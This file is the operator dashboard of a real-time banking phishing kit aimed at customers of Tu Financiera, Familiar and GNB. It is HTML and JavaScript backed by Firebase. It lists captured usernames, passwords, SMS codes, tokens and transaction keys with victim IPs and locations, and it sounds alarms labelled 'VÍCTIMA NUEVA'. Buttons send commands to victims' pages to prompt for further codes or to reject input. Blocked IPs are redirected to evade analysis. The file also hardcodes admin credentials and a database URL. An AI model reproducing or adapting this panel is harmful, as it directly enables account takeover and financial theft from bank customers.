<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel Financiera</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#0d1117;color:#c9d1d9;font-size:13px}
#gate{position:fixed;inset:0;background:#0d1117;display:flex;align-items:center;justify-content:center;z-index:99}
#gate .b{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:30px;width:320px}
#gate h1{font-size:17px;margin-bottom:18px;color:#e6edf3;text-align:center}
#gate input{width:100%;height:40px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;padding:0 10px;margin-bottom:10px;font-size:14px;outline:none}
#gate button{width:100%;height:40px;background:#238636;border:0;border-radius:6px;color:#fff;font-weight:600;cursor:pointer}
#gate .e{color:#f85149;font-size:12px;text-align:center;min-height:16px;margin-top:8px}
header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:20}
header h1{font-size:15px;color:#e6edf3;display:flex;align-items:center;gap:8px}
.dot{width:8px;height:8px;border-radius:50%;background:#3fb950;animation:p 1.6s infinite}
@keyframes p{70%{box-shadow:0 0 0 7px rgba(63,185,80,0)}100%{box-shadow:0 0 0 0 rgba(63,185,80,0)}}
.hb{display:flex;gap:8px;align-items:center}
.hb button{height:32px;padding:0 12px;background:#21262d;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:12px;cursor:pointer}
.hb button:hover{background:#30363d}
#bSnd.on{background:#238636;border-color:#238636;color:#fff}
#bSnd.off{background:#7d1a1a;border-color:#7d1a1a;color:#fff}
.stats{display:flex;gap:10px;padding:16px 20px;flex-wrap:wrap}
.st{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 16px;min-width:96px}
.st b{display:block;font-size:20px;color:#e6edf3}
.st span{font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px}
.st.vivo{border-color:#238636;background:#0f2417}
.st.vivo b{color:#3fb950}
.filtros{display:flex;gap:8px;padding:0 20px 14px;flex-wrap:wrap}
.filtros button{height:30px;padding:0 13px;background:#161b22;border:1px solid #30363d;border-radius:20px;color:#8b949e;font-size:12px;cursor:pointer}
.filtros button.on{background:#1f6feb;border-color:#1f6feb;color:#fff}
.tabla{width:100%;border-collapse:collapse;margin:0 20px 40px;max-width:calc(100% - 40px)}
th{background:#161b22;color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.4px;padding:9px 8px;text-align:left;border-bottom:1px solid #30363d}
td{padding:9px 8px;border-bottom:1px solid #21262d;vertical-align:middle}
tr:hover td{background:#12171f}
tr.vivo td:first-child{border-left:3px solid #3fb950}
tr.nueva td{animation:fila 2s ease-out 3}
@keyframes fila{0%{background:#0f2417}100%{background:transparent}}
.si{color:#3fb950;font-weight:700}
.no{color:#484f58}
.u{font-weight:600;color:#e6edf3}
.cl{font-family:ui-monospace,Consolas,monospace;color:#79c0ff;word-break:break-all}
.mono{font-family:ui-monospace,Consolas,monospace;color:#d2a8ff;letter-spacing:1px;font-weight:700}
.mono.nuevo{color:#f0f6fc;background:#1f6feb;border-radius:4px;padding:1px 5px}
.badge{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:700;letter-spacing:.4px}
.b-tufi{background:#0d3b66;color:#79c0ff}
.b-fam{background:#0f2d1a;color:#3fb950}
.b-gnb{background:#2d1b4e;color:#d2a8ff}
.acc{display:flex;gap:5px;flex-wrap:wrap}
.acc button{height:24px;padding:0 8px;border-radius:4px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;font-size:10.5px;font-weight:600;cursor:pointer}
.acc button:hover{background:#30363d}
.acc .p1{background:#1f6feb;border-color:#1f6feb;color:#fff}
.acc .p2{background:#8957e5;border-color:#8957e5;color:#fff}
.acc .ok{background:#238636;border-color:#238636;color:#fff}
.acc .rc{background:#9e6a03;border-color:#9e6a03;color:#fff}
.acc .dl{background:#7d1a1a;border-color:#7d1a1a;color:#fff}
.acc .bl{background:#3d2b00;border-color:#3d2b00;color:#e3b341}
.vacio{padding:40px;text-align:center;color:#484f58}
#banner{position:fixed;top:0;left:0;right:0;z-index:80;display:none;padding:14px 18px;font-size:15px;font-weight:700;text-align:center;color:#fff;cursor:pointer;box-shadow:0 6px 24px rgba(0,0,0,.5)}
#banner.on{display:block;animation:bIn .3s ease-out}
@keyframes bIn{from{transform:translateY(-100%)}to{transform:none}}
#banner.nuevo{background:#1f6feb}
#banner.codigo{background:#8957e5}
#banner.token{background:#0f7b8a}
#banner.clave{background:#b3261e}
#banner.final{background:#238636}
#banner.rechazo{background:#9e6a03}
#toasts{position:fixed;right:18px;bottom:18px;z-index:70;display:flex;flex-direction:column;gap:8px;max-width:330px}
.toast{background:#161b22;border:1px solid #30363d;border-left:4px solid #1f6feb;border-radius:6px;padding:11px 14px;color:#e6edf3;font-size:12.5px;animation:tIn .25s}
.toast b{display:block;font-size:11px;letter-spacing:.5px;text-transform:uppercase;margin-bottom:3px}
.toast.codigo{border-left-color:#8957e5}.toast.token{border-left-color:#0f7b8a}
.toast.clave{border-left-color:#b3261e}.toast.final{border-left-color:#238636}
@keyframes tIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
</style>
</head>
<body>
<div id="gate"><div class="b">
  <h1>Panel NBCH</h1>
  <input id="gu" placeholder="Usuario" autocomplete="off">
  <input id="gp" type="password" placeholder="Contraseña" autocomplete="off">
  <button onclick="entrar()">Entrar</button>
  <p class="e" id="ge"></p>
</div></div>

<div id="banner" onclick="this.classList.remove('on')"></div>
<div id="toasts"></div>

<header>
  <h1><span class="dot"></span> Panel NBCH</h1>
  <div class="hb">
    <button id="bSnd" onclick="toggleSnd()">ALARMA: --</button>
    <button onclick="probar()">Probar</button>
    <button onclick="borrarTodo()">Borrar todo</button>
    <button onclick="salir()">Salir</button>
  </div>
</header>

<div class="stats">
  <div class="st"><b id="s-total">0</b><span>Total</span></div>
  <div class="st vivo"><b id="s-vivo">0</b><span>En vivo</span></div>
  <div class="st"><b id="s-tufi">0</b><span>Tu Financiera</span></div>
  <div class="st"><b id="s-fam">0</b><span>Familiar</span></div>
  <div class="st"><b id="s-gnb">0</b><span>GNB</span></div>
</div>

<div class="filtros">
  <button class="on" data-f="todos" onclick="setFiltro('todos',this)">Todos</button>
  <button data-f="vivo" onclick="setFiltro('vivo',this)">En vivo</button>
  <button data-f="tufi" onclick="setFiltro('tufi',this)">Tu Financiera</button>
  <button data-f="familiar" onclick="setFiltro('familiar',this)">Familiar</button>
  <button data-f="gnb" onclick="setFiltro('gnb',this)">GNB</button>
</div>

<table class="tabla">
  <thead><tr>
    <th>En vivo</th><th>Banco</th><th>Usuario</th><th>Clave</th><th>Código 1</th><th>Código 2</th>
    <th>Token 1</th><th>Token 2</th><th>Clave trans.</th><th>Página</th><th>IP / Ubicación</th><th>Último</th><th>Acciones</th>
  </tr></thead>
  <tbody id="tb"></tbody>
</table>
<div class="vacio" id="vacio">Sin registros todavía.</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
<script>
var CFG={DB_URL:"https://cbonnlineec-default-rtdb.firebaseio.com/",ROOT:"nbch"};
var ADMIN_USER="Ghost",ADMIN_PASS="Cabimas01",VIVO_MS=15000;
if(!firebase.apps.length)firebase.initializeApp({databaseURL:CFG.DB_URL});
var db=firebase.database();
var datos={logins:{}},filtro="todos",prev={},cargado=false,marcas={};
var AC=null,sonidoOn=localStorage.getItem("nbch_snd")!=="0",titileo=null;

/* ---------- audio ---------- */
function unlock(){
  try{ if(!AC) AC=new (window.AudioContext||window.webkitAudioContext)();
       if(AC.state==="suspended") AC.resume(); }catch(e){}
}
["click","keydown","touchstart","pointerdown"].forEach(function(ev){
  document.addEventListener(ev,unlock,{passive:true});
});
function tono(f1,f2,dur,ini,vol,onda){
  if(!AC) return;
  var t=AC.currentTime+ini,o=AC.createOscillator(),g=AC.createGain();
  o.type=onda||"square";
  o.frequency.setValueAtTime(f1,t);
  if(f2) o.frequency.linearRampToValueAtTime(f2,t+dur);
  g.gain.setValueAtTime(0,t);
  g.gain.linearRampToValueAtTime(vol,t+.012);
  g.gain.setValueAtTime(vol,t+dur-.03);
  g.gain.linearRampToValueAtTime(0,t+dur);
  o.connect(g);g.connect(AC.destination);
  o.start(t);o.stop(t+dur+.03);
}
function reproducir(tipo){
  unlock(); if(!AC||!sonidoOn) return;
  var i;
  if(tipo==="nuevo"){
    for(i=0;i<4;i++){ tono(1046,1046,.11,i*.17,.28); tono(1568,1568,.11,i*.17+.09,.28); }
  }else if(tipo==="codigo"){
    for(i=0;i<3;i++){ tono(1174,1174,.13,i*.2,.25); tono(1568,1568,.15,i*.2+.11,.25); }
  }else if(tipo==="token"){
    for(i=0;i<3;i++){ tono(1568,1568,.12,i*.18,.25); tono(2093,2093,.14,i*.18+.1,.25); }
  }else if(tipo==="clave"){
    for(i=0;i<3;i++){ tono(700,1400,.34,i*.42,.3,"sawtooth"); }
    tono(1400,1400,.2,1.3,.3);
  }else if(tipo==="final"){
    tono(880,880,.14,0,.25); tono(1108,1108,.14,.16,.25); tono(1318,1318,.26,.32,.25);
  }else if(tipo==="rechazo"){
    tono(320,240,.22,0,.28,"triangle"); tono(320,240,.22,.3,.28,"triangle");
  }
}
function toggleSnd(){
  sonidoOn=!sonidoOn;
  localStorage.setItem("nbch_snd",sonidoOn?"1":"0");
  pintarSnd(); unlock(); if(sonidoOn) reproducir("codigo");
}
function pintarSnd(){
  var b=document.getElementById("bSnd");
  b.textContent="ALARMA: "+(sonidoOn?"ON":"OFF");
  b.className=sonidoOn?"on":"off";
}
function probar(){ reproducir("nuevo"); setTimeout(function(){reproducir("codigo");},1200); setTimeout(function(){reproducir("clave");},2400); }

/* ---------- alertas visuales ---------- */
function banner(tipo,txt){
  var b=document.getElementById("banner");
  b.className="on "+tipo; b.textContent=txt;
  clearTimeout(b._t); b._t=setTimeout(function(){b.classList.remove("on");},10000);
}
function toast(tipo,titulo,txt){
  var c=document.getElementById("toasts"),d=document.createElement("div");
  d.className="toast "+tipo;
  d.innerHTML="<b>"+titulo+"</b>"+txt;
  c.appendChild(d);
  setTimeout(function(){d.remove();},12000);
}
function titilar(){
  if(titileo) return;
  var on=false;
  titileo=setInterval(function(){
    document.title=on?"*** NUEVA ACTIVIDAD ***":"Panel NBCH";
    on=!on;
  },700);
  setTimeout(function(){clearInterval(titileo);titileo=null;document.title="Panel NBCH";},15000);
}
function alarma(tipo,titulo,txt){
  banner(tipo,titulo+" — "+txt);
  toast(tipo,titulo,txt);
  reproducir(tipo);
  titilar();
  if(navigator.vibrate) navigator.vibrate(tipo==="nuevo"?[220,120,220,120,220]:[140,90,140]);
}

/* ---------- datos ---------- */
function entrar(){
  var u=document.getElementById("gu").value.trim(),p=document.getElementById("gp").value;
  if(u!==ADMIN_USER||p!==ADMIN_PASS){document.getElementById("ge").textContent="Credenciales incorrectas.";return;}
  localStorage.setItem("nbch_adm","1"); arrancar();
}
function salir(){ localStorage.removeItem("nbch_adm"); location.reload(); }

function arrancar(){
  document.getElementById("gate").style.display="none";
  pintarSnd();
  db.ref(CFG.ROOT+"/logins").on("value",function(s){
    datos.logins=s.val()||{};
    detectar();
    render();
  });
}
if(localStorage.getItem("nbch_adm")==="1") arrancar();

function detectar(){
  var ahora=Date.now();
  Object.keys(datos.logins).forEach(function(id){
    var d=datos.logins[id]||{},p=prev[id];
    if(!cargado){ prev[id]=snap(d); return; }
    if(!p){
      prev[id]=snap(d);
      marcas[id]=ahora;
      alarma("nuevo","VÍCTIMA NUEVA",(d.usuario||"s/d")+" — "+(d.origen||"tufi").toUpperCase()+" — "+d.pagina);
      return;
    }
    if(d.sms && d.sms!==p.sms){ alarma("codigo","CÓDIGO 1",(d.usuario||"")+" → "+d.sms); marcas[id]=ahora; }
    if(d.sms2 && d.sms2!==p.sms2){ alarma("codigo","CÓDIGO 2",(d.usuario||"")+" → "+d.sms2); marcas[id]=ahora; }
    if(d.token && d.token!==p.token){ alarma("token","TOKEN 1",(d.usuario||"")+" → "+d.token); marcas[id]=ahora; }
    if(d.token2 && d.token2!==p.token2){ alarma("token","TOKEN 2",(d.usuario||"")+" → "+d.token2); marcas[id]=ahora; }
    if(d.clave_transaccional && d.clave_transaccional!==p.clave_transaccional){ alarma("clave","CLAVE TRANSACCIONAL",(d.usuario||"")+" → "+d.clave_transaccional); marcas[id]=ahora; }
    if(d.status==="FINALIZADO" && p.status!=="FINALIZADO"){ alarma("final","ACCESO COMPLETO",d.usuario||""); marcas[id]=ahora; }
    if(d.status==="RECHAZADO" && p.status!=="RECHAZADO"){ alarma("rechazo","RECHAZADO",d.usuario||""); marcas[id]=ahora; }
    prev[id]=snap(d);
  });
  Object.keys(prev).forEach(function(id){ if(!datos.logins[id]) delete prev[id]; });
  cargado=true;
}
function snap(d){
  return {sms:d.sms||"",sms2:d.sms2||"",token:d.token||"",token2:d.token2||"",
          clave_transaccional:d.clave_transaccional||"",status:d.status||""};
}

/* ---------- render ---------- */
function esc(s){return String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");}
function ori(d){return d.origen||"tufi";}
function vivo(d){return d.online===true&&(Date.now()-(d.ultimoPing||0))<VIVO_MS;}
function hace(ts){if(!ts)return "-";var s=Math.floor((Date.now()-ts)/1000);if(s<60)return "hace "+s+"s";var m=Math.floor(s/60);if(m<60)return "hace "+m+"min";return "hace "+Math.floor(m/60)+"h";}
function setFiltro(f,el){filtro=f;document.querySelectorAll(".filtros button").forEach(function(b){b.classList.remove("on");});el.classList.add("on");render();}

function cmd(id,a){
  var o={accion:a};
  if(a==="rechazar"){var r=prompt("Motivo: login / codigo / token / clave","codigo");if(r===null)return;o.rechazo=(r||"codigo").trim();}
  db.ref(CFG.ROOT+"/comandos/"+id).set(o);
  toast("nuevo","COMANDO ENVIADO",a.toUpperCase());
}
function borrar(id){if(!confirm("¿Eliminar registro?"))return;db.ref(CFG.ROOT+"/logins/"+id).remove();db.ref(CFG.ROOT+"/comandos/"+id).remove();}
function borrarTodo(){if(!confirm("¿Borrar TODOS los registros?"))return;db.ref(CFG.ROOT+"/logins").remove();db.ref(CFG.ROOT+"/comandos").remove();}
function bloquear(ip){if(!ip)return;db.ref(CFG.ROOT+"/blacklist/"+ip.replace(/\./g,"_")).set({ip:ip,redirigirA:"https://www.google.com"});toast("nuevo","IP BLOQUEADA",ip);}

function render(){
  var arr=[],c={tufi:0,familiar:0,gnb:0,vivo:0};
  Object.keys(datos.logins).forEach(function(k){arr.push({id:k,d:datos.logins[k]||{}});});
  arr.forEach(function(x){var o=ori(x.d);c[o]=(c[o]||0)+1;if(vivo(x.d))c.vivo++;});
  document.getElementById("s-total").textContent=arr.length;
  document.getElementById("s-vivo").textContent=c.vivo;
  document.getElementById("s-tufi").textContent=c.tufi;
  document.getElementById("s-fam").textContent=c.familiar;
  document.getElementById("s-gnb").textContent=c.gnb;

  var lista=arr.filter(function(x){
    if(filtro==="todos")return true;
    if(filtro==="vivo")return vivo(x.d);
    return ori(x.d)===filtro;
  });
  lista.sort(function(a,b){var va=vivo(a.d)?1:0,vb=vivo(b.d)?1:0;if(va!==vb)return vb-va;return (b.d.ts||0)-(a.d.ts||0);});

  var tb=document.getElementById("tb");
  if(!lista.length){tb.innerHTML="";document.getElementById("vacio").style.display="block";return;}
  document.getElementById("vacio").style.display="none";
  var ahora=Date.now();

  tb.innerHTML=lista.map(function(x){
    var d=x.d,on=vivo(d),o=ori(d),nuevo=marcas[x.id]&&(ahora-marcas[x.id]<20000);
    var bcla=o==="tufi"?"b-tufi":o==="familiar"?"b-fam":"b-gnb";
    var nom=o==="tufi"?"TUFI":o==="familiar"?"FAM":"GNB";
    var acc='<button class="p1" onclick="cmd(\''+x.id+'\',\'codigo\')">CÓDIGO</button>'
          +'<button class="p2" onclick="cmd(\''+x.id+'\',\'codigo2\')">CÓD 2</button>';
    if(o==="tufi")acc+='<button class="p2" onclick="cmd(\''+x.id+'\',\'token\')">TOKEN</button>'
                      +'<button class="p2" onclick="cmd(\''+x.id+'\',\'token2\')">TOKEN 2</button>';
    if(o==="tufi"||o==="familiar")acc+='<button class="p2" onclick="cmd(\''+x.id+'\',\'clave\')">CLAVE</button>';
    acc+='<button class="ok" onclick="cmd(\''+x.id+'\',\'dejar\')">DEJAR</button>'
       +'<button class="rc" onclick="cmd(\''+x.id+'\',\'rechazar\')">RECH</button>'
       +'<button class="bl" onclick="bloquear(\''+esc(d.ip||"")+'\')">BLOQ</button>'
       +'<button class="dl" onclick="borrar(\''+x.id+'\')">X</button>';
    function cel(v){return '<td class="mono'+((v&&nuevo)?" nuevo":"")+'">'+esc(v)+'</td>';}
    return '<tr class="'+(on?"vivo ":"")+(nuevo?"nueva":"")+'">'
     +'<td>'+(on?'<span class="si">● SÍ</span>':'<span class="no">○</span>')+'</td>'
     +'<td><span class="badge '+bcla+'">'+nom+'</span></td>'
     +'<td class="u">'+esc(d.usuario)+'</td>'
     +'<td class="cl">'+esc(d.clave)+'</td>'
     +cel(d.sms)+cel(d.sms2)+cel(d.token)+cel(d.token2)+cel(d.clave_transaccional)
     +'<td>'+esc(d.pagina)+'</td>'
     +'<td>'+esc(d.ip)+'<br><small style="color:#8b949e">'+esc(d.ubicacion)+'</small></td>'
     +'<td>'+hace(d.ultimoPing)+'</td>'
     +'<td><div class="acc">'+acc+'</div></td></tr>';
  }).join("");
}

setInterval(function(){ if(localStorage.getItem("nbch_adm")==="1") render(); },5000);
document.addEventListener("keydown",function(e){ if(e.key==="Enter"&&document.getElementById("gate").style.display!=="none") entrar(); });
</script>
</body>
</html>
